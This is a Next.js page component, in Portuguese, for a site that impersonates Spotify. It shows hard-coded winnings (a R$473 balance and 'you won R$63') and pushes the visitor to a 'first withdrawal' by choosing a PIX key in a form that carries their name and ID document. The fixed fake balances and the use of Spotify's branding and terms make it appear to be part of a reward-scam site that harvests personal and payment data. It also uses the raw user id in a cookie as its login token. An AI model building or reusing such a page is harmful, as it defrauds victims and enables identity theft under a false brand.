import Image from "next/image";
import Logo from '@/assets/logo-green.png'
import { cookies } from "next/headers";
import { FormPayment } from "./form-payment";
import { redirect } from "next/navigation";
import { db } from "@/lib/prisma";


export default async function PaymentPage() {

  const token = cookies().get('token')?.value

  if (!token) {
    redirect('/spotify/register')
  }

  const user = await db.user.findUnique({
    where: {
      id: token
    }
  })



  if (!user) {
    redirect('/spotify/register')
  }

  return (
    <div className="w-full relative min-h-screen bg-[#181818] text-white">
      <div className="sticky z-50 top-0 left-0 right-0 h-16 bg-black flex items-center justify-between p-5">
        <Image src={Logo} className='object-contain' width={100} height={30} alt='logo' priority />


        <div className="relative border border-[#01D661] rounded-lg flex items-center gap-1 py-1 px-4 text-black">
          <span className="absolute bg-black -top-2 left-2 px-1 text-[10px] font-semibold text-[#01D661]">SALDO</span>
          <span className="text-black text-lg font-semibold">
            <span className='text-xs text-white font-semibold'>{new Intl.NumberFormat('pt-BR', {
              style: 'currency',
              currency: 'BRL'
            }).format(473)}</span>
          </span>
        </div>

      </div>

      <div className='w-full p-5'>
        <div className='w-full bg-black rounded-lg p-5 space-y-8'>

          <h2 className='text-2xl font-bold text-center'>Olá, {user.name.toUpperCase().split(" ")[0]}!</h2>


          <div className='text-center space-y-4 bg-[#01d661]/40 border border-[#01D661] p-4 rounded-lg text-white/90'>
            <p className="text-sm">
              Você ganhou <span className='text-sm font-bold text-white'>{new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL'
              }).format(63)}
              </span>
            </p>


            <h2 className="text-2xl font-bold">SALDO : {new Intl.NumberFormat('pt-BR', {
              style: 'currency',
              currency: 'BRL'
            }).format(473)}</h2>

          </div>


          {/* <p className="text-sm font-[#a8a8a8] text-center">
            Antes de realizar seu 1° saque, vamos te enviar um <span className="font-semibold">PIX TESTE de R$ 0,01 CENTAVO</span> para confirmar se está tudo certo com o seu cadastro!
          </p> */}

          <p className="text-sm font-[#a8a8a8] text-center">
            Realize seu <span className="font-semibold">PRIMEIRO SAQUE</span> imediato!
          </p>


          <div className="flex items-center justify-center gap-2">
            <svg className="text-white fill-[#4db6ac] size-5" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="30" height="30" viewBox="0 0 30 30">
              <path d="M 15 1.0996094 C 13.975 1.0996094 12.949922 1.4895313 12.169922 2.2695312 L 7.1894531 7.25 L 7.3398438 7.25 C 8.6098437 7.25 9.7992188 7.740625 10.699219 8.640625 L 14.189453 12.130859 C 14.639453 12.570859 15.360547 12.570859 15.810547 12.130859 L 19.300781 8.640625 C 20.200781 7.740625 21.390156 7.25 22.660156 7.25 L 22.810547 7.25 L 17.830078 2.2695312 C 17.050078 1.4895313 16.025 1.0996094 15 1.0996094 z M 5.6894531 8.75 L 2.2695312 12.169922 C 0.70953125 13.729922 0.70953125 16.270078 2.2695312 17.830078 L 5.6894531 21.25 L 7.3398438 21.25 C 8.2098438 21.25 9.030625 20.910781 9.640625 20.300781 L 13.130859 16.810547 C 14.160859 15.780547 15.839141 15.780547 16.869141 16.810547 L 20.359375 20.300781 C 20.969375 20.910781 21.790156 21.25 22.660156 21.25 L 24.310547 21.25 L 27.730469 17.830078 C 29.290469 16.270078 29.290469 13.729922 27.730469 12.169922 L 24.310547 8.75 L 22.660156 8.75 C 21.790156 8.75 20.969375 9.0892188 20.359375 9.6992188 L 16.869141 13.189453 C 16.359141 13.699453 15.68 13.960938 15 13.960938 C 14.32 13.960938 13.640859 13.699453 13.130859 13.189453 L 9.640625 9.6992188 C 9.030625 9.0892187 8.2098437 8.75 7.3398438 8.75 L 5.6894531 8.75 z M 15 17.539062 C 14.7075 17.539062 14.414453 17.649141 14.189453 17.869141 L 10.699219 21.359375 C 9.7992188 22.259375 8.6098437 22.75 7.3398438 22.75 L 7.1894531 22.75 L 12.169922 27.730469 C 13.729922 29.290469 16.270078 29.290469 17.830078 27.730469 L 22.810547 22.75 L 22.660156 22.75 C 21.390156 22.75 20.200781 22.259375 19.300781 21.359375 L 15.810547 17.869141 C 15.585547 17.649141 15.2925 17.539062 15 17.539062 z"></path>
            </svg>
            <p className="text-sm font-[#a8a8a8] text-center">Selecione sua chave PIX:</p>
          </div>


          <FormPayment name={user.name} document={user.document} />

          <p className="text-center text-xs text-[#a8a8a8] pt-10">
            Este site é protegido pelo reCAPTCHA e está sujeito à <b className="text-[#01d661]">Política de Privacidade</b> e aos <b className="text-[#01d661]">Termos de Serviço do Spotify ®.</b>
          </p>

        </div>
      </div>




    </div>
  )
}